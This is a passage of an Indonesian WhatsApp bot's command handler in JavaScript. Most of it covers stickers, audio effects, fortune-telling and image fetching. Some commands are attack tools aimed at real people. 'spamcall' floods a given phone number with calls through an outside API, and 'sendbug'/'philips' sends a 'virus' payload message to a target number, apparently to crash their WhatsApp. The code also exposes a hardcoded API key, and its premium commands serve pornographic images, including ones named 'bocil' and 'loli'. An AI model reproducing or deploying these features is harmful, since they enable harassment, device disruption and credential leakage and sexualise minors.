var emo2 = q.split("+")[1]
if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
.then(data => {
var opt = { packname: pack_name, author: aut_hor }
conn.sendImageAsSticker(from, data.results[0].url, msg, opt)
}).catch((e) => reply(mess.error.api))
break

case 'emojimix2': {
if (!q) return reply(`Example : ${prefix + command} 😅`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
for (let res of anu.results) {
var opt = { packname: pack_name, author: aut_hor }
let encmedia = await conn.sendImageAsSticker(from, res.url, msg, opt)
}
}
break

case 'smeme':
case 'stikermeme':
case 'stickermeme':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: pack_name, author: aut_hor }
conn.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break

case 'swm':
case 'wm':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
var pname = q.split('|')[0]
var athor = q.split('|')[1]
reply(mess.wait)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
}
break

case 'sticker':
case 's': 
case 'stiker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
//reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.jpeg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
fs.unlinkSync(`./${rand2}`)})}).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat('webp').save(`${rand2}`)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} atau balas gambar yang sudah dikirim`)
}
break

case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(buffer)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
} else {
reply(`Kirim video dengan caption ${prefix+command} atau balas video yang sudah dikirim`)
}
break

case 'boneka': case 'cecan': case 'cogan': case 'darkjokes': case 'islamic': case 'mobil': case 'programing': case 'tatasurya': case 'wallhp':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const x35  = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`)); 
const x36 = x35[Math.floor(Math.random() * (x35.length))]
conn.sendMessage(from, {image:{url:x36}, caption:"Done!", mentions:[sender]},{quoted:msg})
break

// PREMIUM ONLY
// BIAR GAK DI SPAM

case 'bocil': 
case 'ukhty': 
case 'santuy': 
case 'rika': 
case 'hijaber': 
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply(mess.wait)
const x33 = JSON.parse(fs.readFileSync(`./function/Random_IMAGE/${command}.json`)); 
const x34 = x33[Math.floor(Math.random() * (x33.length))]
conn.sendMessage(from, {video:{url:x34.url}, caption:"Done!", mentions:[sender]},{quoted:msg})
break

case 'spamcall':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => reply(mess.error.api))
if (data.status == false) {
reply(data.msg)
} else {
reply(data.logs)
}
}
break
// LOGO MAKER
case 'girlneko': 
case 'gilrneko':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #girlneko aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/girlneko?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'sadboy':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/sadboy?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'kaneki': 
case 'rem': 
case 'lolimaker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukkan text\nContoh: #${command} bot`)
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/${command}?nama=${q}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'waifu':case 'lick':case 'kiss':case 'awoo':case 'hug':case 'cry':case 'cuddle':case 'bully':case 'megumin':case 'shinobu':case 'neko':case 'slap':case 'wink':case 'dance':case 'poke':case 'glomp':case 'bite':case 'nom':case 'handhold':case 'highfive':case 'wave':case 'smile':case 'yeet':case 'bonk':case 'smug':case 'pat':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
//if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
reply(mess.wait)
fetchJson(`https://api.waifu.pics/sfw/${command}`).then(x => {
conn.sendMessage(from, {image:{url:x.url}, caption:"✅ Done", mentions:[sender]},{quoted:msg})})
break

// PRIMBON
case 'ramalanjodoh': case 'ramaljodoh': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'nomorhoki':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} 62895340684706`)
let anu = await primbon.nomer_hoki(q)
if (anu.status == false) return reply(anu.message)
reply (`> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
 if (!q) return reply( `Example :\n${prefix+command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} Yanto`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply( `Example :\n${prefix+command} yanto, 7, 7, 2005`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${anu.message.nama}\n> *Lahir :* ${anu.message.tgl_lahir}\n> *Life Path :* ${anu.message.life_path}\n> *Destiny :* ${anu.message.destiny}\n> *Destiny Desire :* ${anu.message.destiny_desire}\n> *Personality :* ${anu.message.personality}\n> *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example :\n${prefix+command} yanto|yanti`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'sifatusaha': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Example : ${prefix+command} 24, 10, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`)
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': 
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!quoted && !q) reply(`Kirim/reply text dengan caption *${prefix+command}*`)
var ter = command[0].toLowerCase()
var tex = quoted ? quoted.text ? quoted.text : q ? q : text : q ? q : text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break

// AUDIO CHANGER
case 'bass':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'blown':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af acrusher=.1:1:64:0:log'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'deep':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'earrape':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af volume=12'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fast':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fat':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'nightcore':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'reverse':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "areverse"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'robot':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'slow':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'smooth':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'tupai':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

// Random image
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpaperteknologi':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let toth = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Technology.json`)
let random = toth[Math.floor(Math.random() * toth.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break
case 'wallpaperanime':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let tozs = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/anime-wallpaper-pic.json`)
let random = tozs[Math.floor(Math.random() * tozs.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpapergamer':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let toew = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/GameWallp.json`)
let random = toew[Math.floor(Math.random() * toew.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpaperprogamer':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let xeke = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Programming.json`)
let random = xeke[Math.floor(Math.random() * xeke.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpapermeme':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let crkr = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/meme.json`)
let random = crkr[Math.floor(Math.random() * crkr.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'wallpaper':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let crpe = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`)
let random = crpe[Math.floor(Math.random() * crpe.length)]
conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
}
break

case 'ppcouple': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
conn.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: msg })
conn.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: msg })
}
break

case 'hentai':
case 'ahegao':
case 'ass':
case 'bdsm':
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'jahy':
case 'masturbation':
case 'orgy':
case 'panties':
case 'pussy':
case 'thighs':
case 'yuri':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
let cndn = await fetchJson(`https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/${command}.json`)
let random = cndn[Math.floor(Math.random() * cndn.length)]
conn.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break

case 'jadibot': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
jadibot(conn, msg, from)
}
break

case 'listjadibot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
try {
let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await conn.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
conn.sendMessage(from,{text:te,mentions: [y], },{quoted:msg})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break

// FIX BUG
case 'sendbug':
case 'philips':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Error!\n*Contoh:*\n${prefix+command} 628xxx`)
var num = q+"@s.whatsapp.net"
var dev = '62895340684706@s.whatsapp.net'
if (num == dev) return reply('Itu developer gua')
if (num == sender) return reply('Itu Nomor Lu Sendiri')
await sleep(3000)
conn.sendMessage(num, {text:philips}, {quoted:virusnya})
await sleep(3000)
mentions(`Sukses kirim philips to @${num.split('@')[0]}`, [num])
}
break

case 'philips2':{
//if (!isOwner) return reply(mess.OnlyOwner)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
